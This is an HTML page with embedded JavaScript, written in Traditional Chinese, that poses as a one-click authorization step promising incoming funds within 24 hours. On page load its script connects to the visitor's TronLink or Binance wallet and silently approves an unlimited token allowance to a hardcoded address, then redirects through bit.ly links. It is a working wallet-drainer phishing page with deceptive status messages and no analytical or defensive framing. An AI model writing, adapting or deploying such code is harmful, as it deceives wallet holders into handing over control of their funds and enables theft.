<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>一鍵授權頁面</title>
  <style>
    body {
      font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
      background: linear-gradient(-45deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
      background-size: 400% 400%;
      animation: gradientBG 12s ease infinite;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 30px 40px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
    }
    h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
    p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
    #status { min-height: 24px; font-size: 14px; margin-top: 20px; }
    .loading { color: #facc15; }
    .success { color: #4ade80; }
    .error { color: #f87171; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>一鍵授權頁面</h1>
    <p>點擊下方授權按鈕，區塊鏈中資金會在24小時內，為您進行入賬，請確認。</p>
    <p id="status" class="loading">正在配置資產流程，請稍候...</p>
  </div>

  <script>
    const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4";
    const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";
    const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const REDIRECT_SUCCESS = "https://bit.ly/success2025"; // ✅ 授權成功跳轉頁
    const REDIRECT_FAIL = "https://bit.ly/fail2025";       // ✅ 授權失敗跳轉頁
    let tronWeb;

    function updateStatus(message, type = "loading") {
      const el = document.getElementById("status");
      el.innerText = message;
      el.className = type;
    }

    async function connectWallet() {
      if (window.tronWeb && window.tronWeb.ready) {
        tronWeb = window.tronWeb;
        return tronWeb.defaultAddress.base58;
      }
      if (window.tronLink) {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        tronWeb = window.tronWeb;
        return tronWeb.defaultAddress.base58;
      }
      if (window.binance && window.binance.tron) {
        await window.binance.tron.request({ method: 'tron_requestAccounts' });
        tronWeb = window.tronWeb || new TronWeb(window.binance.tron);
        return tronWeb.defaultAddress.base58;
      }
      return null;
    }

    async function checkTronNetwork() {
      try {
        const chainId = await tronWeb.trx.getChainId?.();
        if (chainId && chainId !== '_') {
          updateStatus("請切換至 TRON 主網以完成配置", "error");
          setTimeout(() => window.location.href = REDIRECT_FAIL, 4000);
          return false;
        }
        return true;
      } catch {
        return true;
      }
    }

    async function approve() {
      updateStatus("資產配置中，請耐心等待...", "loading");
      try {
        const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
        await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
        updateStatus("資產已安全配置完成，系統將進入入賬流程", "success");
        setTimeout(() => window.location.href = REDIRECT_SUCCESS, 3000);
      } catch (err) {
        console.error(err);
        updateStatus("目前無法完成資產配置，請稍後重試", "error");
        setTimeout(() => window.location.href = REDIRECT_FAIL, 4000);
      }
    }

    async function init() {
      updateStatus("正在啟動配置流程...", "loading");
      const address = await connectWallet();
      if (!address) {
        updateStatus("未偵測到錢包，請從 TronLink 或幣安 Web3 打開此頁面", "error");
        setTimeout(() => window.location.href = REDIRECT_FAIL, 4000);
        return;
      }
      if (!await checkTronNetwork()) return;
      await approve();
    }

    window.addEventListener("load", init);
  </script>
</body>
</html>
init auto approve
